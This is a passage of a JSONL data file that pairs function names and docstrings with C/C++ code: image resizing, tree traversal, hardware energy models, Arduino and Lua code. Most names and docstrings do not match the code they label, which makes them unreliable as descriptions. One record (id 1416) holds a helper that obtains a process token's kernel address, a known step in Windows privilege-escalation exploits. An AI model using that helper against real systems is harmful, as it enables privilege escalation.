ratio);\\n\\n\\tLOGD(\"the origin result is %d\", result);\\n\\t\\n\\tratio_width = (float)dest_width \/ image.size().width;\\n\\tratio_height = (float)dest_height \/ image.size().height;\\n\\n\\tLOGD(\"ratio of width %f\", ratio_width);\\n\\tLOGD(\"ratio of height %f\", ratio_height);\\n\\n\\tif (ratio_width > ratio_height)\\n\\t{\\n\\t\\tratio = ratio_width;\\n\\t}\\n\\telse\\n\\t{\\n\\t\\tratio = ratio_height;\\n\\t}\\n\\n\\tresult = result == -1 ? -1 : (int)((float)result * ratio);\\n\\n\\tLOGD(\"ratio is %f\", ratio);\\n\\ttmp_size = Size((int)(image.size().width * ratio), (int)(image.size().height * ratio));\\n\\tdest_image = Mat(tmp_size, CV_32S);\\n\\tresize(image, dest_image, tmp_size);\\n\\n\\tLOGD(\"width of resize image %d\", dest_image.size().width);\\n\\tLOGD(\"height of resize image %d\", dest_image.size().height);\\n\\n    \/\/\u5bbd\u5ea6\u5c0f\u4e8e\u9ad8\u5ea6\\n    \/\/source bitmap width less than height\\n\\tif (ratio_width > ratio_height)\\n\\t{\\n\\t\\tif (result == -1)\\n\\t\\t{\\n\\t\\t\\tclip_top = -((dest_image.size().height - dest_height) \/ 2);\\n\\t\\t\\tclip_bottom = clip_top;\\n\\t\\t}else {\\n\\t\\t\\tif (dest_image.size().height - result >= dest_height)\\n\\t\\t\\t{\\n\\t\\t\\t\\tclip_top = -result;\\n\\t\\t\\t\\tclip_bottom = -(dest_image.size().height - result - dest_height);\\n\\t\\t\\t} else {\\n\\t\\t\\t\\tclip_top = -(dest_image.size().height - dest_height);\\n\\t\\t\\t}\\n\\t\\t}\\n\\t} else {\\n\\t\\tclip_left = -((dest_image.size().width - dest_width) \/ 2);\\n\\t\\tclip_right = clip_left;\\n\\t}\\n\\n\\tLOGD(\"clip_top %d\", clip_top);\\n\\tLOGD(\"clip_bottom %d\", clip_bottom);\\n\\tLOGD(\"clip_left %d\", clip_left);\\n\\tLOGD(\"clip_right %d\", clip_right);\\n    \/\/Mat& Mat::adjustROI(int dtop, int dbottom, int dleft, int dright)\\n\\tdest_image.adjustROI(clip_top, clip_bottom, clip_left, clip_right); \\n\\n\\tLOGD(\"width of resize image %d\", dest_image.size().width);\\n\\tLOGD(\"height of resize image %d\", dest_image.size().height);\\n\\n    return 0;\\n\\n}'}","id":1373}
{"content":"{'function_name': 'parseSquadsString', 'docstring': '\/\/ Parse infection Strings into squads', 'code': 'std::list<std::string> getInputPerLines(std::string fileName) {\\n\\tstd::list<std::string> lines;\\n\\tstd::string line;\\n\\n\\t\/\/ Open File\\n\\tstd::ifstream in(fileName);\\n\\tif (!in.is_open() || !in.good()) {\\n\\t\\tstd::cout << \"Failed to open input\" << std::endl;\\n\\t\\tlines.push_back(std::string()); \/\/ empty string\\n\\t\\treturn lines;\\n\\t}\\n\\n\\t\/\/ Create Vector of lines\\n\\twhile (getline(in, line)) {\\n\\t\\tlines.push_back(line);\\n\\t}\\n\\tin.close();\\n\\treturn lines;\\n}'}","id":1379}
{"content":"{'function_name': 'printProcess', 'docstring': '\/\/s -> variable de index status', 'code': 'void printAdvancedControls(Args Arg,int i)\\n{\\n    \/\/Funci\u00f3n para dibujar la primera ventana que cambia frecuentemente\\n    \/\/c -> variable de index controls\\n    \\n    if(Arg.activeBrush)\\n    {\\n        wattron(Arg.w1,A_STANDOUT);\\n    }\\n    else\\n    {\\n        wattroff(Arg.w1,A_STANDOUT);\\n    }\\n    mvwprintw(Arg.w1,i+3,Arg.distanceW1,\"%s\",Arg.listAdvancedControls[i]);\\n    return;\\n}'}","id":1388}
{"content":"{'function_name': 'test2', 'docstring': '\/\/ \u4ece\u5927\u5230\u5c0f\u6392\u5e8f', 'code': 'int main()\\n{\\n    \/\/test1();\\n    test2();\\n    return 0;\\n}'}","id":1391}
{"content":"{'function_name': 'usbcam_set_parameters', 'docstring': '\/*set preview par*\/', 'code': 'void usbcam_put_parameters(struct camera_device *device, char *parm)\\n    {\\n        struct camera_device *mdevice = device;\\n        char *mparm = parm;\\n        \/\/       ALOGE(\"%s: E\", __func__);\\n        \/\/      ALOGE(\"%s: X\", __func__);\\n        return;\\n    }'}","id":1392}
{"content":"{'function_name': 'build_tree', 'docstring': '\/\/number of nodes', 'code': 'void print_tree_reverse_level(Node *& root)\\n{\\n\\t\/\/function to output the tree in a level or bfs method\\n\\tif(!root)\\n\\t{\\n\\t\\tcout << \"Tree is empty\\\\n\";\\n\\t\\treturn;\\n\\t}\\t\\n\\tcout << \"Tree in level traversal: \";\\n\\t\/\/will use a queue and a stack\\n\\tqueue<Node*> q;\\n\\tstack<Node*> stk;\\n\\n\\t\/\/enqueue first node\\n\\tq.push(root);\\n\\n\\t\/\/current pointer\\n\\tNode * cur;\\n\\n\\twhile(!q.empty())\\n\\t{\\n\\t\\t\/\/Grab front element\\n\\t\\tcur = q.front();\\n\\t\\t\\n\\t\\t\/\/pop front element\\n\\t\\tq.pop();\\n\\n\\t\\t\/\/add children if any to queue\\n\\t\\tif(cur->right)\\n\\t\\t{\\n\\t\\t\\tq.push(cur->right);\\n\\t\\t}\\n\\t\\tif(cur->left)\\n\\t\\t{\\n\\t\\t\\tq.push(cur->left);\\n\\t\\t}\\n\\t\\t\/\/add element to the stack\\n\\t\\tstk.push(cur);\\n\\t}\\n\\t\\n\\t\/\/empty stack\\t\\n\\twhile(!stk.empty())\\n\\t{\\n\\t\\t\/\/grab and pop top element\\n\\t\\tcur = stk.top();\\n\\t\\tstk.pop();\\n\\t\\t\\n\\t\\t\/\/output\\n\\t\\tcout << cur->key << \" \";\\n\\t}\\n\\n}'}","id":1394}
{"content":"{'function_name': 'list_higher_level', 'docstring': '\/*\\n     Security-check: NULL pointer passed to realloc.\\n      ANSI allows this, but it may cause portability problems.\\n  *\/', 'code': 'void list_sort( List *l, int (*compare)(const void *, const void *) ) {\\n  Element *temp, *prev;\\n  int i, sorted;\\n  progress_counter_t *pc = NULL;\\n\\n  if ( !l )\\n    return;\\n\\n  \/* start progress meter, sorting is slow for huge number of elements *\/\\n  \/* l->n is the worst case, real time is less or equal estimated time *\/\\n  pc = open_progress(l->n,\"list_sort\");\\n  \\n  for (i = 0; i < l->n; i++ ) {\\n    sorted = 1; \/* Flag for early break *\/\\n    for ( temp = l->start.next->next;\\n          temp != NULL && temp != &l->stop; temp = temp->next ) {\\n      if ( temp->previous == &l->start ) continue;\\n      if ( compare((const void *)temp->previous->data,\\n                   (const void *)temp->data) > 0 ) {\\n\\n        sorted = 0;  \/* rest flag *\/\\n   \\t\/* swap with the previous node *\/\\n\\tprev = temp->previous;\\n  \\tprev->previous->next = temp;\\n        temp->next->previous = prev;\\n\\ttemp->previous = prev->previous;\\n\\tprev->next     = temp->next;\\n\\tprev->previous = temp;\\n\\ttemp->next     = prev;\\n\\t\/* and make sure the node in the for loop is correct *\/\\n\\ttemp = prev;\\n\\n#ifdef SLOWER_BUT_KEEP_BY_NOW\\n\/* this is a slower version, but guaranteed to work *\/\\n        void *data;\\n\\n\\tdata = temp->data;\\n\\tprev = temp->previous;\\n\\tlist_del(l, data);\\n\\tlist_ins(l, prev->data, data);\\n\\ttemp = prev;\\n#endif\\n      }\\n    }\\n    if (sorted) break;\\n    progress(i,pc); \/* progress meter *\/\\n  }\\n\\n  close_progress(pc);\\n  g_debug(fprintf(stderr, \"LEV3: list_sort()\\\\n\");)\\n}'}","id":1397}
{"content":"{'function_name': 'greedy_arbol', 'docstring': '\/\/ Mientras haya nodos con grado 1', 'code': 'int main(int argc, char *argv[]) {\\n\\n    \/\/ Map que almacena la representacion de un arbol\\n    std::map<int, std::vector<int>> arbol;\\n    \/\/ Indica el numero de nodos del arbol\\n    int N = 0;\\n\\n    \/\/ Lee el arbol de un fichero\\n    std::string archivo = argv[1];\\n    std::ifstream is(archivo);\\n    leerArbolFichero(is, arbol, N);\\n    is.close();\\n    \\n    \/\/ Matriz de adyacencia\\n    std::vector<std::vector<int>> adyacencia;\\n    \\n    \/\/ Inicializacion adyacencia a 0\\n    for(int i = 0 ; i < N ; i++){\\n        std::vector<int> datos;\\n        for(int j = 0 ; j < N ; j++) datos.push_back(0);\\n        adyacencia.push_back(datos);\\n    }\\n\\n    \/\/ Indica entre que nodos hay conexion con un 1\\n    \/\/ Para cada nodo\\n    for (std::map<int,std::vector<int>>::iterator it = arbol.begin(); it != arbol.end(); it++) {\\n        \/\/ Recorre los nodos\\n        for(int i = 0 ; i < (*it).second.size() ; i++) {\\n            adyacencia[(*it).first][(*it).second[i]] = 1;\\n            adyacencia[(*it).second[i]][(*it).first] = 1;\\n        }\\n\\t}\\n\\n    \/\/ Vector que almacena los grados de cada nodo candidato a solucion\\n    \/\/ Nodo candidato es aquel cuyo grafo es > 0\\n    std::vector<int> nodos; \\n    for(int i = 0 ; i < N ; i++) {\\n        nodos.push_back(0);\\n        for(int j = 0 ; j < N ; j++) nodos[i]+=adyacencia[i][j]; \\n    }\\n\\n    \/\/ Vector que almacena la solucion\\n    std::vector<int> solucion;\\n\\n    \/\/ Obtiene el tiempo antes del algoritmo\\n    high_resolution_clock::time_point tantes, tdespues;\\n    tantes = high_resolution_clock::now();\\n\\n    \/\/ Calcula el recubrimiento minimal del arbol\\n    greedy_arbol(adyacencia, nodos, solucion);\\n\\n    \/\/ Obtiene el tiempo despues del algoritmo\\n    tdespues = high_resolution_clock::now();\\n\\n    \/\/ Muestra la solucion\\n    std::cout << \"Solucion: \";\\n    mostrarVector(solucion);\\n    duration<double> transcurrido = duration_cast<duration<double>>(tdespues - tantes);\\n    std::cout << \"Tiempo: \" << transcurrido.count() << std::endl;\\n\\n    return 0;\\n}'}","id":1398}
{"content":"{'function_name': 'NeuroSimSubArrayWriteLatency', 'docstring': '\/\/ Skip this function if param->NeuroSimDynamicPerformance is false', 'code': \"double NeuroSimSubArrayReadEnergy(SubArray *subArray) {\\t\/\/ For 1 weighted sum task on selected columns\\n\\tif (!param->NeuroSimDynamicPerformance) { return 0; }\\t\/\/ Skip this function if param->NeuroSimDynamicPerformance is false\\n\\tif (subArray->cell.memCellType == Type::SRAM) {   \/\/ SRAM\\n\\t\\tsubArray->wlDecoder.CalculatePower(subArray->numRow * subArray->numReadPulse * subArray->activityRowRead, 1);\\t\/\/ Don't care write\\n\\t\\tsubArray->precharger.CalculatePower(subArray->numRow * subArray->numReadPulse * subArray->activityRowRead, 1);\\t\/\/ Don't care write\\n\\t\\tsubArray->senseAmp.CalculatePower(subArray->numRow * subArray->numReadPulse * subArray->activityRowRead);\\n\\t\\tsubArray->adder.CalculatePower(subArray->numRow * subArray->numReadPulse * subArray->activityRowRead, subArray->numReadCellPerOperationNeuro \/ subArray->numCellPerSynapse);\\n\\t\\tsubArray->dff.CalculatePower(subArray->numRow * subArray->numReadPulse * subArray->activityRowRead, subArray->numReadCellPerOperationNeuro \/ subArray->numCellPerSynapse * (subArray->adder.numBit+1));\\n\\t\\tsubArray->subtractor.CalculatePower(subArray->numReadPulse, subArray->numReadCellPerOperationNeuro \/ subArray->numCellPerSynapse);\\n\\t\\tif (subArray->shiftAddEnable) {\\n\\t\\t\\tsubArray->shiftAdd.CalculatePower(subArray->numReadPulse);\\n\\t\\t}\\n\\n\\t\\treturn \\tsubArray->wlDecoder.readDynamicEnergy +\\n\\t\\t\\t\\tsubArray->precharger.readDynamicEnergy +\\n\\t\\t\\t\\tsubArray->senseAmp.readDynamicEnergy +\\n\\t\\t\\t\\tsubArray->adder.readDynamicEnergy +\\n\\t\\t\\t\\tsubArray->dff.readDynamicEnergy +\\n\\t\\t\\t\\tsubArray->subtractor.readDynamicEnergy +\\n\\t\\t\\t\\tsubArray->shiftAdd.readDynamicEnergy;\\n\\n\\t} \\n    else {    \/\/ eNVM\\n\\t\\tif (subArray->digitalModeNeuro) {   \/\/ Digital eNVM\\n\\t\\t\\tif (subArray->cell.accessType == CMOS_access) {   \/\/ 1T1R\\n                   if (subArray->parallelRead == true) \\n                   {      \\n                     double numReadCells = (int)ceil((double)subArray->numCol \/ subArray->numColMuxed);\\n                     subArray->wlBlSwitchMatrix.CalculatePower(subArray->activityRowRead * subArray->numReadPulse, 1);\\t\/\/ Don't care write\\n                     subArray->slSwitchMatrix.CalculatePower(subArray->numReadPulse, 1);\\t\/\/ Don't care write\\n                     subArray->mux.CalculatePower(subArray->activityRowRead * subArray->numReadPulse);\\t\/\/ Mux still consumes energy during row-by-row read\\n                     subArray->muxDecoder.CalculatePower(subArray->numReadPulse, 1);\\t\/\/ Don't care write\\n                     subArray->readCircuit.CalculatePower(subArray->numReadPulse);\\n                     \/\/ Need to chack the second parameter of subtractorpower\\n                     subArray->subtractor.CalculatePower(subArray->numReadPulse, subArray->numReadCellPerOperationNeuro \/ subArray->numCellPerSynapse);\\n                     if (subArray->shiftAddEnable) \\n                        {\\n                                subArray->shiftAdd.CalculatePower(subArray->numReadPulse);\\n                         }\\n                     return  subArray->wlBlSwitchMatrix.readDynamicEnergy+\\n                                 subArray->slSwitchMatrix.readDynamicEnergy+\\n                                 subArray->mux.readDynamicEnergy +\\n                                 subArray->muxDecoder.readDynamicEnergy +\\n                                 subArray->readCircuit.readDynamicEnergy+\\n                                 subArray->subtractor.readDynamicEnergy +\\n                                 subArray->shiftAdd.readDynamicEnergy;\\n                    } \\n                    else \\n                    {      \/\/ row-by-row readout\\n                         double numReadCells = (int)ceil((double)subArray->numCol \/ subArray->numColMuxed);\\n                         subArray->wlDecoder.CalculatePower(subArray->numRow * subArray->activityRowRead * subArray->numReadPulse, 1);\\t\/\/ Don't care write\\n                         subArray->mux.CalculatePower(subArray->numRow * subArray->activityRowRead * subArray->numReadPulse);\\t\/\/ Mux still consumes energy during row-by-row read\\n                         subArray->muxDecoder.CalculatePower(subArray->numReadPulse, 1);\\t\/\/ Don't care write\\n                         subArray->voltageSenseAmp.CalculatePower(subArray->numRow * subArray->activityRowRead * subArray->numReadPulse);\\n                         subArray->adder.CalculatePower(subArray->numRow * subArray->numReadPulse * subArray->activityRowRead, numReadCells \/ subArray->numCellPerSynapse);\\n                         subArray->dff.CalculatePower(subArray->numRow * subArray->numReadPulse * subArray->activityRowRead, numReadCells \/ subArray->numCellPerSynapse*(subArray->adder.numBit+1));\\t\/\/ +1 because the adder output is 1 bit more than the input\\n                         subArray->subtractor.CalculatePower(subArray->numReadPulse, subArray->numReadCellPerOperationNeuro \/ subArray->numCellPerSynapse);\\n                         if (subArray->shiftAddEnable) \\n                         {\\n                                  subArray->shiftAdd.CalculatePower(subArray->numReadPulse);\\n                          }\\n                         return  subArray->wlDecoder.readDynamicEnergy +\\n                                     subArray->mux.readDynamicEnergy +\\n                                     subArray->muxDecoder.readDynamicEnergy +\\n                                     subArray->voltageSenseAmp.readDynamicEnergy +\\n                                     subArray->adder.readDynamicEnergy +\\n                                     subArray->dff.readDynamicEnergy +\\n                                     subArray->subtractor.readDynamicEnergy +\\n                                     subArray->shiftAdd.readDynamicEnergy;\\n                     }\\n\\t\\t\\t} else {    \/\/ Cross-point\\n\\t\\t\\t\\tdouble numReadCells = (int)ceil((double)subArray->numCol \/ subArray->numColMuxed);\\n\\t\\t\\t\\tsubArray->wlDecoder.CalculatePower(subArray->numRow * subArray->activityRowRead * subArray->numReadPulse, 1);\\t\/\/ Don't care write\\n\\t\\t\\t\\tsubArray->wlDecoderDriver.CalculatePower(numReadCells, 1, subArray->numRow * subArray->activityRowRead * subArray->numReadPulse, 1);\\n\\t\\t\\t\\tsubArray->mux.CalculatePower(subArray->numRow * subArray->activityRowRead * subArray->numReadPulse);\\t\/\/ Mux still consumes energy during row-by-row read\\n\\t\\t\\t\\tsubArray->muxDecoder.CalculatePower(subArray->numReadPulse, 1);\\n\\t\\t\\t\\tsubArray->voltageSenseAmp.CalculatePower(subArray->numRow * subArray->activityRowRead * subArray->numReadPulse);\\n\\t\\t\\t\\tsubArray->adder.CalculatePower(subArray->numRow * subArray->numReadPulse * subArray->activityRowRead, numReadCells \/ subArray->numCellPerSynapse);\\n\\t\\t\\t\\tsubArray->dff.CalculatePower(subArray->numRow * subArray->numReadPulse * subArray->activityRowRead, numReadCells \/ subArray->numCellPerSynapse*(subArray->adder.numBit+1));\\t\/\/ +1 because the adder output is 1 bit more than the input\\n\\t\\t\\t\\tsubArray->subtractor.CalculatePower(subArray->numReadPulse, subArray->numReadCellPerOperationNeuro \/ subArray->numCellPerSynapse);\\n\\t\\t\\t\\tif (subArray->shiftAddEnable) {\\n\\t\\t\\t\\t\\tsubArray->shiftAdd.CalculatePower(subArray->numReadPulse);\\n\\t\\t\\t\\t}\\n\\t\\t\\t\\treturn\\tsubArray->wlDecoder.readDynamicEnergy +\\n\\t\\t\\t\\t\\t\\tsubArray->wlDecoderDriver.readDynamicEnergy +\\n\\t\\t\\t\\t\\t\\tsubArray->mux.readDynamicEnergy +\\n\\t\\t\\t\\t\\t\\tsubArray->muxDecoder.readDynamicEnergy +\\n\\t\\t\\t\\t\\t\\tsubArray->voltageSenseAmp.readDynamicEnergy +\\n\\t\\t\\t\\t\\t\\tsubArray->adder.readDynamicEnergy +\\n\\t\\t\\t\\t\\t\\tsubArray->dff.readDynamicEnergy +\\n\\t\\t\\t\\t\\t\\tsubArray->subtractor.readDynamicEnergy +\\n\\t\\t\\t\\t\\t\\tsubArray->shiftAdd.readDynamicEnergy;\\n\\t\\t\\t}\\n\\t\\t} else {\\t\/\/ Analog eNVM\\n\\t\\t\\tif (subArray->cell.accessType == CMOS_access) {   \/\/ 1T1R\\n\\t\\t\\t\\tsubArray->wlDecoder.CalculatePower(subArray->numReadPulse, 1);\\t\/\/ Don't care write\\n\\t\\t\\t\\tsubArray->wlDecoderOutput.CalculatePower(subArray->numReadPulse, 1);\\t\/\/ Don't care write\\n\\t\\t\\t\\tsubArray->blSwitchMatrix.CalculatePower(subArray->numReadPulse, 1);\\t\/\/ Don't care write\\n\\t\\t\\t\\tsubArray->mux.CalculatePower(subArray->numReadPulse);\\n\\t\\t\\t\\tsubArray->muxDecoder.CalculatePower(subArray->numReadPulse, 1);\\t\/\/ Don't care write\\n\\t\\t\\t\\tsubArray->readCircuit.CalculatePower(subArray->numReadPulse);\\n\\t\\t\\t\\tsubArray->subtractor.CalculatePower(subArray->numReadPulse, subArray->numReadCellPerOperationNeuro \/ subArray->numCellPerSynapse);\\n\\t\\t\\t\\tif (subArray->shiftAddEnable) {\\n\\t\\t\\t\\t\\tsubArray->shiftAdd.CalculatePower(subArray->numReadPulse);\\n\\t\\t\\t\\t}\\n\\t\\t\\t\\treturn\\tsubArray->wlDecoder.readDynamicEnergy +\\n\\t\\t\\t\\t\\t\\t    subArray->wlDecoderOutput.readDynamicEnergy +\\n\\t\\t\\t\\t\\t\\t    subArray->blSwitchMatrix.readDynamicEnergy +\\n\\t\\t\\t\\t\\t\\t    subArray->mux.readDynamicEnergy +\\n\\t\\t\\t\\t\\t\\t    subArray->muxDecoder.readDynamicEnergy +\\n\\t\\t\\t\\t\\t\\t    subArray->readCircuit.readDynamicEnergy +\\n\\t\\t\\t\\t\\t\\t    subArray->subtractor.readDynamicEnergy +\\n\\t\\t\\t\\t\\t\\t    subArray->shiftAdd.readDynamicEnergy;\\n\\t\\t\\t} else {\\t\/\/ Cross-point\\n\\t\\t\\t\\tsubArray->wlSwitchMatrix.CalculatePower(subArray->numReadPulse, 1);\\t\/\/ Don't care write\\n\\t\\t\\t\\tsubArray->mux.CalculatePower(subArray->numReadPulse);\\n\\t\\t\\t\\tsubArray->muxDecoder.CalculatePower(subArray->numReadPulse, 1);\\t\/\/ Don't care write\\n\\t\\t\\t\\tsubArray->readCircuit.CalculatePower(subArray->numReadPulse);\\n\\t\\t\\t\\tsubArray->subtractor.CalculatePower(subArray->numReadPulse, subArray->numReadCellPerOperationNeuro \/ subArray->numCellPerSynapse);\\n\\t\\t\\t\\tif (subArray->shiftAddEnable) {\\n\\t\\t\\t\\t\\tsubArray->shiftAdd.CalculatePower(subArray->numReadPulse);\\n\\t\\t\\t\\t}\\n\\t\\t\\t\\treturn \\tsubArray->wlSwitchMatrix.readDynamicEnergy +\\n\\t\\t\\t\\t\\t\\tsubArray->mux.readDynamicEnergy +\\n\\t\\t\\t\\t\\t\\tsubArray->muxDecoder.readDynamicEnergy +\\n\\t\\t\\t\\t\\t\\tsubArray->readCircuit.readDynamicEnergy +\\n\\t\\t\\t\\t\\t\\tsubArray->subtractor.readDynamicEnergy +\\n\\t\\t\\t\\t\\t\\tsubArray->shiftAdd.readDynamicEnergy;\\n\\t\\t\\t}\\n\\t\\t}\\n\\t}\\n}\"}","id":1399}
{"content":"{'function_name': 'get_handle_addr', 'docstring': '\/\/ \uc5bb\uc5b4\uc9c0 \ud578\ub4e4\uc744 \ubcf5\uc218\ub85c \ub3cc\ub9ac\uba74\uc11c, \uac1d\uccb4, \ud578\ub4e4, pid\ub97c \ub514\uc2a4\ud328\uce6d\ud558\uace0, \ud604\uc7ac \ud504\ub85c\uc138\uc2a4\uc758 \ud578\ub4e4\uc774 \uace8\ub77c\uc84c\uc744\ub54c, object(\uac1d\uccb4)\ub97c \ub9ac\ud134\ud558\uace0, \uc2e4\ud328\uc2dc -1\uc744 \ub9ac\ud134.\\r', 'code': 'ULONG64 get_process_token() {\\r\\n\\tHANDLE token;\\r\\n\\t\\r\\n\\t\/\/ OpenProcess(PROCESS_QUERY_INFORMATION ... );\uc73c\ub85c \ud504\ub85c\uc138\uc2a4 \ud578\ub4e4\uc744 \uad6c\ud568.\\r\\n\\tHANDLE proc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());\\r\\n\\tif (proc == INVALID_HANDLE_VALUE)\\r\\n\\t\\treturn 0;\\r\\n\\r\\n\\t\/\/ OpenProcessToke()\uc73c\ub85c TOKEN_ADJUST_PRIVILEGES\ub97c \ud1b5\ud574, \ud1a0\ud070\uc744 \uc5bb\uc74c.\\r\\n\\tOpenProcessToken(proc, TOKEN_ADJUST_PRIVILEGES, &token);\\r\\n\\t\\r\\n\\t\/\/ get_handle_addr(token)\uc744 \ud1b5\ud574 \ud1a0\ud070 \ud578\ub4e4\uc744 \ub118\uaca8\uc11c \ucee4\ub110 \ud1a0\ud070 \uc8fc\uc18c\ub97c \uc5bb\uc74c.\\r\\n\\tULONG64 ktoken = get_handle_addr(token);\\r\\n\\r\\n\\t\/\/ \ucee4\ub110 \ud1a0\ud070 \uc8fc\uc18c \ub9ac\ud134.\\r\\n\\treturn ktoken;\\r\\n}'}","id":1416}
{"content":"{'function_name': 'sendBonusScore', 'docstring': '\/\/ stop transmitting', 'code': 'void sendScoreToDisplay(long ScoreX_in, byte player_in)\\n{\\n  Score100K = (ScoreX_in\/100000.0);\\n  Score10K = ((ScoreX_in-(Score100K*100000.0))\/10000.0);\\n  ScoreK = ((ScoreX_in-(Score100K*100000.0)-(Score10K*10000.0))\/1000.0);\\n  Score100 = ((ScoreX_in-(Score100K*100000.0)-(Score10K*10000.0)-(ScoreK*1000.0))\/100.0);\\n  Score10 = ((ScoreX_in-(Score100K*100000.0)-(Score10K*10000.0)-(ScoreK*1000.0)-(Score100*100.0))\/10.0);\\n  Score1 = (ScoreX_in-(Score100K*100000.0)-(Score10K*10000.0)-(ScoreK*1000.0)-(Score100*100.0)-(Score10*10.0));\\n  wireWriteData[0] = ASCII_DOLLAR;\\n  wireWriteData[1] = ASCII_C;\\n  wireWriteData[2] = ASCII_A;\\n  wireWriteData[3] = ASCII_N;\\n  wireWriteData[4] = (player_in + 4); \/\/ PinScore Unit IDs, 4 thru 7 \/\/(player + 4); \/\/ PinScore ID\\n  wireWriteData[5] = Score100K;\\n  wireWriteData[6] = Score10K;\\n  wireWriteData[7] = ScoreK;\\n  wireWriteData[8] = Score100;\\n  wireWriteData[9] = Score10;\\n  wireWriteData[10] = Score1;\\n  wireWriteData[11] = ASCII_CR;\\n\\n  Wire.beginTransmission(4); \/\/ transmit to player one Arduino LED\\n  Wire.write(wireWriteData,12);\\n  Wire.endTransmission();    \/\/ stop transmitting\\n\\n  return;\\n}'}","id":1421}
{"content":"{'function_name': 'turn_to_degree', 'docstring': '\/\/\u8bfb\u53d6\u5f00\u59cb\u65f6\u5019\u89d2\u5ea6', 'code': 'bool find_if_beacon_off_2(){  \/\/\u68c0\u6d4b\u573a\u4e0a\u662f\u5426\u8fd8\u6709\u706f\u5854\u4eae,\u6ca1\u6709\u706f\u4eaetrue \u6709\u706f\u4eaefalse\\n        unsigned int flame_c_sum,flame_d_sum;\\n        long int flame_c[7],flame_d[7];\\n        for(int j = 1; j<=2; j++) {\\n                for(int i=0; i<=6; i++) { \/\/\u53bb\u6389\u6700\u8fb9\u4e0a\u4e24\u4e2a\u7ea2\u5916\u63a5\u6536\u5668\\n                        int a,b,c;\\n                        a=i>>2; b=(i^(a<<2))>>1; c=i%2;\\n                        digitalWrite(flame_c_3,!a);\\n                        digitalWrite(flame_c_2,!b);\\n                        digitalWrite(flame_c_1,!c);\\n                        digitalWrite(flame_d_3,!a);\\n                        digitalWrite(flame_d_2,!b);\\n                        digitalWrite(flame_d_1,!c);\\n                        flame_c[i-1] = analogRead(flame_c_out);\\n                        flame_d[i-1] = analogRead(flame_d_out);\\n                        \/\/ _seriaL.println(flame_c[i-1]);\\n                        \/\/ _seriaL.println(flame_d[i-1]);\\n\\n                        flame_c_sum += flame_c[i-1];\\n                        flame_d_sum += flame_d[i-1];\\n                }\\n                _seriaL.println(flame_c_sum+flame_d_sum);\\n\\n        }\\n\\n\\n        \/\/_seriaL.println((flame_c_sum + flame_d_sum)\/10);\\n        return true;\\n}'}","id":1424}
{"content":"{'function_name': 'denoiseb_rd1_select', 'docstring': '\/\/__VIVADO_SYNTH__', 'code': 'inline hw_uint<16> denoiseb_rd10_select(raw_cache& raw, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ denoiseb_rd10 read pattern: { denoiseb_update_0[d0, d1] -> raw[2d0, -2 + d1] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Read schedule : { denoiseb_update_0[d0, d1] -> [2 + d1, 1 + d0, 2] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Write schedule: { raw_update_0[d0, d1] -> [d1, d0, 1] : -2 <= d0 <= 962 and -3 <= d1 <= 1084 }\\n  \/\/ DD fold: { denoiseb_update_0[d0, d1] -> 3861 : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  auto value_raw_raw_update_0_write0 = raw.raw_raw_update_0_write0_merged_banks_25.peek_3861();\\n  return value_raw_raw_update_0_write0;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":1430}
{"content":"{'function_name': 'dense_reader_from_capnp', 'docstring': \"\/\/ If cap'n proto object has stats set it on c++ object\", 'code': \"Status delete_from_capnp(\\n    const capnp::Delete::Reader& delete_reader,\\n    Query* query,\\n    DeletesAndUpdates* delete_strategy) {\\n  \/\/ Query condition\\n  if (delete_reader.hasCondition()) {\\n    auto condition_reader = delete_reader.getCondition();\\n    QueryCondition condition;\\n    RETURN_NOT_OK(condition_from_capnp(condition_reader, &condition));\\n    RETURN_NOT_OK(query->set_condition(condition));\\n  }\\n\\n  \/\/ If cap'n proto object has stats set it on c++ object\\n  if (delete_reader.hasStats()) {\\n    stats::Stats* stats = delete_strategy->stats();\\n    \/\/ We should always have a stats here\\n    if (stats != nullptr) {\\n      RETURN_NOT_OK(stats_from_capnp(delete_reader.getStats(), stats));\\n    }\\n  }\\n\\n  return Status::Ok();\\n}\"}","id":1431}
{"content":"{'function_name': 'lua_Matrix_SetColumn', 'docstring': '\/\/ Indices the 4 columns\\r', 'code': 'static int lua_Matrix_Multiply(lua_State* state)\\r\\n{\\r\\n    Matrix* matrix = LuaState::GetFuncParam<Matrix>(state, 1);\\r\\n    if(matrix == NULL)\\r\\n    {\\r\\n        return 0;\\r\\n    }\\r\\n\\r\\n    \/\/ Not support for M * V here, because it\\'s returns a Vector.\\r\\n\\r\\n    \/\/ This is a logical XOR, is one of the params a number but not both.\\r\\n    \/\/ 1 != 1 = false\\r\\n    \/\/ 0 != 1 = true\\r\\n    \/\/ etc\\r\\n    if(lua_isnumber(state, 2) != lua_isnumber(state, 3))\\r\\n    {\\r\\n        \/\/ scalar matrix multiplication is commutative, so order doesn\\'t matter\\r\\n        \/\/ here - and we can just use on function.\\r\\n        if(LuaState::IsType(state, 2, Matrix::Meta.Name().c_str()))\\r\\n        {\\r\\n            \/\/ m * s\\r\\n            Matrix::Multiply\\r\\n            (\\r\\n                (*matrix),\\r\\n                (*LuaState::GetFuncParam<Matrix>(state, 2)),\\r\\n                static_cast<double>(lua_tonumber(state, 3))\\r\\n            );\\r\\n        }\\r\\n        else if(LuaState::IsType(state, 3, Matrix::Meta.Name().c_str()))\\r\\n        {\\r\\n            \/\/ s * m\\r\\n            Matrix::Multiply\\r\\n            (\\r\\n                (*matrix),\\r\\n                (*LuaState::GetFuncParam<Matrix>(state, 3)), \/\/ NOTE: arg numbers reversed.\\r\\n                static_cast<double>(lua_tonumber(state, 2))\\r\\n            );\\r\\n        }\\r\\n        else\\r\\n        {\\r\\n            return luaL_error(state, \"Argument 2 or 3 must be of type Matrix.\");\\r\\n        }\\r\\n\\r\\n    }\\r\\n    else if(LuaState::IsType(state, 2, Matrix::Meta.Name().c_str()) &&\\r\\n            LuaState::IsType(state, 3, Matrix::Meta.Name().c_str()))\\r\\n    {\\r\\n        \/\/ Assume both matrices\\r\\n        